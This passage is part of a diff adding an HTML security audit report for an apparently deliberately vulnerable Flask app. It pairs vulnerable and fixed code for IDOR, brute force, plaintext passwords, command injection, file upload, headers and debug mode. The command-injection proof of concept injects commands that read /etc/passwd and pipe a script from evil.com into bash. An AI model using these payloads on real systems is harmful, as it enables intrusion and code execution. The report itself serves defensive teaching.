+        <div class="code-block-header">✓ Secure Code</div>
+        <pre><span class="hl-kw">import</span> os, secrets
+app.secret_key = <span class="hl-good">os.environ.get("FLASK_SECRET_KEY")</span> \
+    <span class="hl-kw">or</span> secrets.token_hex(<span class="hl-good">32</span>)
+<span class="hl-cm"># Store in .env / vault, never in code</span></pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Move all secrets to environment variables</strong> — use <code style="font-family:var(--mono)">python-dotenv</code> for local dev, a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production.</li>
+        <li><strong>Add <code style="font-family:var(--mono)">.env</code> to <code style="font-family:var(--mono)">.gitignore</code></strong> and rotate any key that has ever been committed to git.</li>
+        <li><strong>Use <code style="font-family:var(--mono)">secrets.token_hex(32)</code></strong> to generate a cryptographically strong key.</li>
+        <li><strong>Run Semgrep or git-secrets</strong> in CI to block secret commits before they reach the repository.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-04 IDOR ─────────────────────────────────────────────────── -->
+<div class="vuln-card" id="v04">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-04</span>
+    <span class="sev-badge sev-HIGH">High</span>
+    <span class="vuln-title">Insecure Direct Object Reference (IDOR)</span>
+    <span class="vuln-cwe">CWE-639 · A01:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A01:2021 — Broken Access Control</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:111–124</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Any user can view any other user's full profile including plaintext password</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Very Low — increment URL integer</div></div>
+    </div>
+    <div class="vuln-desc">The <code style="font-family:var(--mono)">/user/&lt;id&gt;</code> endpoint returns another user's full record — including their plaintext password — to any authenticated user. There is no ownership check: a logged-in user simply changes the URL integer to access any account.</div>
+    <div style="background:var(--crit-bg);border:1px solid var(--crit-br);border-radius:8px;padding:.85rem 1.1rem;margin-bottom:1rem;font-size:.82rem;color:var(--crit)">
+      <strong>⚡ Attack:</strong> Logged in as user ID 3 (bob), visit <code style="font-family:var(--mono)">/user/1</code> → receives admin's email and plaintext password.
+    </div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre><span class="hl-kw">@app.route</span>(<span class="hl-str">"/user/&lt;int:user_id&gt;"</span>)
+<span class="hl-kw">def</span> <span class="hl-fn">view_user</span>(user_id):
+    <span class="hl-cm"># No ownership check!</span>
+    user = conn.execute(
+        <span class="hl-bad">f"SELECT id,username,email,password FROM users WHERE id={user_id}"</span>
+    ).fetchone()
+    <span class="hl-kw">return</span> jsonify({<span class="hl-bad">"password": user[3]</span>})</pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre><span class="hl-kw">@app.route</span>(<span class="hl-str">"/user/&lt;int:user_id&gt;"</span>)
+<span class="hl-kw">@</span><span class="hl-fn">login_required</span>
+<span class="hl-kw">def</span> <span class="hl-fn">view_user</span>(user_id):
+    <span class="hl-cm"># S-04: Ownership check</span>
+    <span class="hl-kw">if</span> <span class="hl-good">session["user_id"] != user_id</span> \
+       <span class="hl-kw">and</span> session.get(<span class="hl-str">"role"</span>) != <span class="hl-str">"admin"</span>:
+        abort(<span class="hl-good">403</span>)
+    <span class="hl-cm"># Never return password_hash</span>
+    <span class="hl-kw">return</span> jsonify({<span class="hl-good">"id": ..., "username": ..., "email": ...</span>})</pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Enforce server-side authorization on every resource</strong> — verify the session user owns the requested record before returning it.</li>
+        <li><strong>Return 403 Forbidden</strong> (not 404) when a user is authenticated but unauthorized.</li>
+        <li><strong>Never return password hashes or internal fields</strong> in API responses — use a serialization allowlist.</li>
+        <li><strong>Prefer UUIDs over sequential IDs</strong> in URLs to make enumeration harder (security-through-obscurity only; not a substitute for access control).</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-05 BROKEN AUTH ──────────────────────────────────────────── -->
+<div class="vuln-card" id="v05">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-05</span>
+    <span class="sev-badge sev-HIGH">High</span>
+    <span class="vuln-title">Broken Authentication — No Rate-Limiting or Lockout</span>
+    <span class="vuln-cwe">CWE-307 · A07:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A07:2021 — Identification &amp; Auth Failures</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:53–70</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Credential stuffing / brute-force against any account</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Low — any automated tool</div></div>
+    </div>
+    <div class="vuln-desc">The login endpoint accepts unlimited requests with no rate-limiting, CAPTCHA, or account lockout. An attacker can automate credential stuffing (using leaked username/password lists) or brute-force any account at thousands of attempts per second. Combined with plaintext passwords (V-06), a single successful attempt yields the cleartext credential.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre><span class="hl-kw">@app.route</span>(<span class="hl-str">"/login"</span>, methods=[<span class="hl-str">"POST"</span>])
+<span class="hl-kw">def</span> <span class="hl-fn">login</span>():
+    <span class="hl-cm"># No rate limit, no lockout, no CAPTCHA</span>
+    <span class="hl-bad">username = request.form.get("username")
+    password = request.form.get("password")</span>
+    <span class="hl-cm"># Direct compare — brute-forceable</span></pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre><span class="hl-cm"># flask-limiter: max 10 attempts/min per IP</span>
+<span class="hl-good">@limiter.limit("10/minute")</span>
+<span class="hl-kw">@app.route</span>(<span class="hl-str">"/login"</span>, methods=[<span class="hl-str">"POST"</span>])
+<span class="hl-kw">def</span> <span class="hl-fn">login</span>():
+    <span class="hl-cm"># Lockout after 5 failures for 15 min</span>
+    <span class="hl-kw">if</span> user[<span class="hl-good">"failed_logins"</span>] >= MAX_FAILED:
+        <span class="hl-kw">return</span> <span class="hl-good">"Account locked"</span>, 429</pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Add IP-based rate-limiting</strong> with <code style="font-family:var(--mono)">flask-limiter</code> — limit login to 5–10 attempts per minute per IP.</li>
+        <li><strong>Implement account lockout</strong> — lock after 5 consecutive failures for 15 minutes; reset on successful login.</li>
+        <li><strong>Return the same generic error</strong> for "wrong username" and "wrong password" to prevent user enumeration.</li>
+        <li><strong>Log all failed attempts</strong> and alert on unusual patterns (100+ failures = active attack).</li>
+        <li><strong>Require MFA</strong> for privileged accounts using TOTP (pyotp).</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-06 PLAINTEXT PASSWORDS ──────────────────────────────────── -->
+<div class="vuln-card" id="v06">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-06</span>
+    <span class="sev-badge sev-HIGH">High</span>
+    <span class="vuln-title">Sensitive Data Exposure — Plaintext Passwords</span>
+    <span class="vuln-cwe">CWE-256 · A02:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A02:2021 — Cryptographic Failures</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:40–44, :120</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Instant credential compromise on any DB access or leak</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">None — passwords readable without any cracking</div></div>
+    </div>
+    <div class="vuln-desc">Passwords are stored and compared as plaintext strings in the database. They are also returned directly in API responses. A single SQL injection, database backup leak, or compromised admin account exposes every user's password — and because people reuse passwords, this extends to their email, banking, and other accounts.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre><span class="hl-cm"># Stored as plaintext</span>
+<span class="hl-bad">INSERT INTO users VALUES (1,'admin','admin123',...)</span>
+
+<span class="hl-cm"># Compared as plaintext</span>
+WHERE username=<span class="hl-bad">'{username}'</span> AND password=<span class="hl-bad">'{password}'</span>
+
+<span class="hl-cm"># Returned in API response</span>
+<span class="hl-bad">"password": user[3]</span></pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre"><span class="hl-kw">from</span> argon2 <span class="hl-kw">import</span> PasswordHasher
+PH = PasswordHasher()
+
+<span class="hl-cm"># Store Argon2 hash</span>
+<span class="hl-good">PH.hash(password)</span>  <span class="hl-cm"># → "$argon2id$..."</span>
+
+<span class="hl-cm"># Constant-time verify</span>
+<span class="hl-good">PH.verify(user["password_hash"], provided)</span>
+
+<span class="hl-cm"># Never return hash in response</span>
+<span class="hl-good">return jsonify({"id":..., "username":...})</span></pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Use Argon2id</strong> (via <code style="font-family:var(--mono)">argon2-cffi</code>) — the current OWASP-recommended algorithm. Fallback: bcrypt or PBKDF2-SHA256 with 260,000+ iterations.</li>
+        <li><strong>Never store or log plaintext passwords</strong> — hash on the way in, verify on the way in, never retrieve.</li>
+        <li><strong>Use constant-time comparison</strong> (<code style="font-family:var(--mono)">hmac.compare_digest</code>) when comparing any secret to prevent timing attacks.</li>
+        <li><strong>Force a password reset</strong> for all users if plaintext passwords were ever stored.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-07 COMMAND INJECTION ──────────────────────────────────────── -->
+<div class="vuln-card" id="v07">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-07</span>
+    <span class="sev-badge sev-CRITICAL">Critical</span>
+    <span class="vuln-title">OS Command Injection</span>
+    <span class="vuln-cwe">CWE-78 · A03:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A03:2021 — Injection</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:129–131</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Remote code execution, full server compromise</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Very Low — single HTTP request</div></div>
+    </div>
+    <div class="vuln-desc">The <code style="font-family:var(--mono)">/ping</code> route passes unsanitized user input directly to <code style="font-family:var(--mono)">subprocess</code> with <code style="font-family:var(--mono)">shell=True</code>. This gives an attacker full shell access to the server — they can read files, install backdoors, pivot laterally, or exfiltrate data.</div>
+    <div style="background:var(--crit-bg);border:1px solid var(--crit-br);border-radius:8px;padding:.85rem 1.1rem;margin-bottom:1rem;font-size:.82rem;color:var(--crit)">
+      <strong>⚡ Proof-of-Concept:</strong><br>
+      <code style="font-family:var(--mono)">GET /ping?host=localhost;cat /etc/passwd</code><br>
+      <code style="font-family:var(--mono)">GET /ping?host=localhost;curl evil.com/shell.sh|bash</code>
+    </div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre>host = request.args.get(<span class="hl-str">"host"</span>)
+<span class="hl-cm"># shell=True + user input = RCE</span>
+result = subprocess.check_output(
+    <span class="hl-bad">f"ping -c 1 {host}"</span>,
+    <span class="hl-bad">shell=True</span>
+)</pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre"><span class="hl-cm"># Strict hostname validation regex</span>
+VALID = re.compile(<span class="hl-good">r"^[a-zA-Z0-9.\-]{1,253}$"</span>)
+<span class="hl-kw">if not</span> VALID.match(host): abort(400)
+
+<span class="hl-cm"># List form + shell=False (default)</span>
+subprocess.check_output(
+    <span class="hl-good">["ping", "-c", "1", host]</span>,
+    timeout=5
+)</pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Never use <code style="font-family:var(--mono)">shell=True</code> with user input</strong> — always pass commands as a list to prevent shell metacharacter interpretation.</li>
+        <li><strong>Validate input with a strict allowlist regex</strong> before passing it to any system call.</li>
+        <li><strong>Prefer Python library alternatives</strong> — use <code style="font-family:var(--mono)">socket.getaddrinfo()</code> or <code style="font-family:var(--mono)">icmplib</code> instead of spawning a shell.</li>
+        <li><strong>Run the application with minimal OS privileges</strong> — a low-privilege user can't install backdoors even if RCE is achieved.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-08 FILE UPLOAD ──────────────────────────────────────────── -->
+<div class="vuln-card" id="v08">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-08</span>
+    <span class="sev-badge sev-MEDIUM">Medium</span>
+    <span class="vuln-title">Insecure File Upload</span>
+    <span class="vuln-cwe">CWE-434 · A04:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A04:2021 — Insecure Design</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:137–148</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Malware upload, path traversal, server storage exhaustion</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Low</div></div>
+    </div>
+    <div class="vuln-desc">Files are saved using the client-supplied filename with no type checking, size limit, or name sanitization. An attacker can upload a web shell (e.g., <code style="font-family:var(--mono)">shell.php</code>), use path traversal (<code style="font-family:var(--mono)">../../../etc/cron.d/evil</code>) to write to arbitrary locations, or upload a large file to exhaust disk space.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre">f = request.files.get(<span class="hl-str">"file"</span>)
+<span class="hl-cm"># No type check, no size limit</span>
+path = os.path.join(UPLOAD_DIR, <span class="hl-bad">f.filename</span>)
+f.save(path)</pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre">ALLOWED = {<span class="hl-good">".jpg",".png",".pdf",".txt"</span>}
+_, ext = os.path.splitext(f.filename)
+<span class="hl-kw">if</span> ext.lower() <span class="hl-kw">not in</span> ALLOWED: abort(400)
+
+<span class="hl-cm"># Random UUID filename — no traversal</span>
+safe = <span class="hl-good">f"{uuid.uuid4().hex}{ext}"</span>
+f.save(os.path.join(UPLOAD_DIR, safe))
+
+<span class="hl-cm"># Flask config cap: 5 MB</span>
+<span class="hl-good">MAX_CONTENT_LENGTH = 5 * 1024 * 1024</span></pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Validate by extension AND MIME type</strong> — check both <code style="font-family:var(--mono)">python-magic</code> content sniffing and the file extension against an allowlist.</li>
+        <li><strong>Randomize filenames</strong> with UUID — never trust the client-supplied name.</li>
+        <li><strong>Set <code style="font-family:var(--mono)">MAX_CONTENT_LENGTH</code></strong> in Flask config to cap upload sizes.</li>
+        <li><strong>Store uploads outside the web root</strong> and serve them through a controller that sets appropriate Content-Type and Content-Disposition headers.</li>
+        <li><strong>Scan uploads with antivirus</strong> (ClamAV) before making them accessible.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-09 MISSING HEADERS ────────────────────────────────────────── -->
+<div class="vuln-card" id="v09">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-09</span>
+    <span class="sev-badge sev-MEDIUM">Medium</span>
+    <span class="vuln-title">Missing HTTP Security Headers</span>
+    <span class="vuln-cwe">CWE-693 · A05:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A05:2021 — Security Misconfiguration</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py — all responses</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Enables clickjacking, MIME sniffing, XSS amplification</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Low — passive defence gap</div></div>
+    </div>
+    <div class="vuln-desc">None of the standard browser security headers are set. Without them, browsers apply permissive defaults: the page can be framed (clickjacking), MIME types can be sniffed (allows content injection), and there's no browser-side XSS filter layer.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre"><span class="hl-cm"># No security headers configured.
+# Flask returns only:
+# Content-Type: text/html
+# No CSP, no X-Frame-Options, etc.</span></pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre"><span class="hl-kw">@app.after_request</span>
+<span class="hl-kw">def</span> <span class="hl-fn">security_headers</span>(resp):
+    resp.headers[<span class="hl-good">"X-Content-Type-Options"</span>] = <span class="hl-str">"nosniff"</span>
+    resp.headers[<span class="hl-good">"X-Frame-Options"</span>]         = <span class="hl-str">"DENY"</span>
+    resp.headers[<span class="hl-good">"Referrer-Policy"</span>]        = <span class="hl-str">"strict-origin"</span>
+    resp.headers[<span class="hl-good">"Content-Security-Policy"</span>] = <span class="hl-str">"default-src 'self';"</span>
+    resp.headers[<span class="hl-good">"Strict-Transport-Security"</span>] = <span class="hl-str">"max-age=31536000"</span>
+    <span class="hl-kw">return</span> resp</pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Add an <code style="font-family:var(--mono)">@app.after_request</code> hook</strong> that sets all security headers on every response.</li>
+        <li><strong>Use <code style="font-family:var(--mono)">flask-talisman</code></strong> for a one-line security header solution with sensible defaults.</li>
+        <li><strong>Verify headers with <a href="https://securityheaders.com" style="color:var(--blue)">securityheaders.com</a></strong> after deployment.</li>
+        <li><strong>Tune CSP incrementally</strong> — start with Report-Only mode to identify violations before enforcing.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<!-- ─── V-10 DEBUG MODE ──────────────────────────────────────────────── -->
+<div class="vuln-card" id="v10">
+  <div class="vuln-header" onclick="toggle(this)">
+    <span class="vuln-id">V-10</span>
+    <span class="sev-badge sev-MEDIUM">Medium</span>
+    <span class="vuln-title">Debug Mode Enabled in Production</span>
+    <span class="vuln-cwe">CWE-94 · A05:2021</span>
+    <span class="chevron">▼</span>
+  </div>
+  <div class="vuln-body">
+    <div class="field-grid">
+      <div><div class="field-label">OWASP Category</div><div class="field-value">A05:2021 — Security Misconfiguration</div></div>
+      <div><div class="field-label">Affected Files</div><div class="field-value">vulnerable_app.py:33, :173</div></div>
+      <div><div class="field-label">Impact</div><div class="field-value">Interactive debugger exposes Python REPL to any visitor</div></div>
+      <div><div class="field-label">Effort to Exploit</div><div class="field-value">Low — triggered by any unhandled exception</div></div>
+    </div>
+    <div class="vuln-desc">Flask's <code style="font-family:var(--mono)">debug=True</code> activates the Werkzeug interactive debugger. On any unhandled exception, any visitor sees a full stack trace and can execute arbitrary Python code via the browser-based REPL — an immediate RCE vector. The app also binds on <code style="font-family:var(--mono)">0.0.0.0</code>, exposing it to all network interfaces.</div>
+    <div class="code-pair">
+      <div class="code-block bad">
+        <div class="code-block-header">✗ Vulnerable Code</div>
+        <pre">app.debug = <span class="hl-bad">True</span>
+app.run(host=<span class="hl-bad">"0.0.0.0"</span>, port=5000, debug=<span class="hl-bad">True</span>)</pre>
+      </div>
+      <div class="code-block good">
+        <div class="code-block-header">✓ Secure Code</div>
+        <pre">app.debug = <span class="hl-good">False</span>
+<span class="hl-cm"># Use production WSGI server</span>
+<span class="hl-cm"># gunicorn -w 4 -b 127.0.0.1:8000 app:app</span>
+<span class="hl-cm"># Never expose Flask dev server publicly</span></pre>
+      </div>
+    </div>
+    <div class="remediation">
+      <h4>Remediation Steps</h4>
+      <ol>
+        <li><strong>Set <code style="font-family:var(--mono)">debug=False</code></strong> unconditionally in production; control via <code style="font-family:var(--mono)">FLASK_ENV=production</code>.</li>
+        <li><strong>Use a production WSGI server</strong> — Gunicorn, uWSGI, or Waitress. Never run the Flask dev server in production.</li>
+        <li><strong>Bind to <code style="font-family:var(--mono)">127.0.0.1</code></strong> and use a reverse proxy (nginx) for external traffic.</li>
+        <li><strong>Implement custom error pages</strong> that log internally but show users only a generic error message.</li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+</section><!-- end vulnerabilities -->
+
+<!-- BEST PRACTICES -->
+<section class="report-section" id="recommendations">
+  <div class="section-eyebrow">Recommendations</div>
+  <h2>Secure Coding Best Practices</h2>
+  <p style="margin-bottom:2rem">Beyond the specific fixes, these foundational practices should be embedded into the development workflow.</p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem">
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <div style="font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:.75rem">Input Validation</div>
+      <ul style="list-style:none;font-size:.83rem;color:var(--subtle);display:flex;flex-direction:column;gap:.4rem">
+        <li>→ Validate type, length, and format of all inputs</li>
+        <li>→ Use allowlists (accepted values) not denylists</li>
+        <li>→ Reject and log malformed input — don't try to clean it</li>
+        <li>→ Validate on the server — client-side only is cosmetic</li>
+      </ul>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <div style="font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:.75rem">Authentication</div>
+      <ul style="list-style:none;font-size:.83rem;color:var(--subtle);display:flex;flex-direction:column;gap:.4rem">
+        <li>→ Argon2id &gt; bcrypt &gt; PBKDF2 for password hashing</li>
+        <li>→ Enforce MFA on all privileged accounts</li>
+        <li>→ Implement PKCE-based OAuth2 for third-party auth</li>
+        <li>→ Short-lived session tokens with absolute expiry</li>
+      </ul>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <div style="font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:.75rem">Dependency Management</div>
+      <ul style="list-style:none;font-size:.83rem;color:var(--subtle);display:flex;flex-direction:column;gap:.4rem">
+        <li>→ Pin dependencies with <code style="font-family:var(--mono)">pip-compile</code></li>
+        <li>→ Run <code style="font-family:var(--mono)">pip-audit</code> in CI to catch known CVEs</li>
+        <li>→ Enable Dependabot / Renovate for automated PRs</li>
+        <li>→ Keep a minimal dependency surface</li>
+      </ul>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem">
+      <div style="font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:.75rem">CI/CD Security Gates</div>
+      <ul style="list-style:none;font-size:.83rem;color:var(--subtle);display:flex;flex-direction:column;gap:.4rem">
+        <li>→ Block merges on Bandit HIGH/CRITICAL findings</li>
+        <li>→ Run Semgrep with OWASP ruleset on every PR</li>
+        <li>→ Secret scanning with Trufflehog or GitHub secret scanning</li>
+        <li>→ DAST (ZAP/Burp) in staging pipeline</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- CHECKLIST -->
+<section class="report-section" id="checklist">
+  <div class="section-eyebrow">Pre-Deployment</div>
+  <h2>Secure Coding Checklist</h2>
+  <p style="margin-bottom:1.5rem">Run through this checklist before every production deployment.</p>
+  <ul class="checklist">
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>All database queries use parameterized statements</strong><span>No string concatenation or f-strings in SQL. ORM preferred.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>No secrets in source code or git history</strong><span>Keys, tokens, and credentials loaded from environment or vault only.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Passwords hashed with Argon2id</strong><span>Never stored or logged as plaintext or MD5/SHA1.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>All output HTML-escaped / template auto-escaping on</strong><span>No <code style="font-family:var(--mono)">| safe</code> on user-controlled data. CSP header set.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Every resource has server-side authorization check</strong><span>Ownership verified before returning any record. 403 on violation.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Rate-limiting on authentication endpoints</strong><span>Max 10 attempts per minute per IP. Account lockout after 5 failures.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>No <code style="font-family:var(--mono)">shell=True</code> with user input</strong><span>All subprocess calls use list form. Input validated by allowlist regex.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>File uploads validated by extension allowlist + size cap</strong><span>UUID filenames. Stored outside web root. MIME type verified.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Full security header suite applied to all responses</strong><span>CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Debug mode OFF. Production WSGI server in use.</strong><span>Gunicorn/uWSGI behind nginx. Error pages show no stack traces.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Bandit + Semgrep passing in CI with no HIGH/CRITICAL findings</strong><span>Automated SAST gates block insecure code from reaching production.</span></div></li>
+    <li class="check-item"><div class="check-icon">✓</div><div><strong>Dependencies scanned for known CVEs</strong><span><code style="font-family:var(--mono)">pip-audit</code> or Safety CI integration active on every build.</span></div></li>
+  </ul>
+</section>
+
+</main>
+</div><!-- .layout -->
+
+<script>
+// Scroll progress
+window.addEventListener('scroll', () => {
+  const s = window.scrollY, t = document.documentElement.scrollHeight - window.innerHeight;
+  document.getElementById('pbar').style.width = (s/t*100)+'%';
+});
+
+// Vuln card accordion
+function toggle(header) {
+  const card = header.closest('.vuln-card');
+  card.classList.toggle('open');
+}
+
+// Active nav highlight
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('.sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => {
+        a.classList.toggle('active', a.getAttribute('href') === '#'+e.target.id);
+      });
+    }
+  });
+}, { rootMargin: '-30% 0px -60% 0px' });
+sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
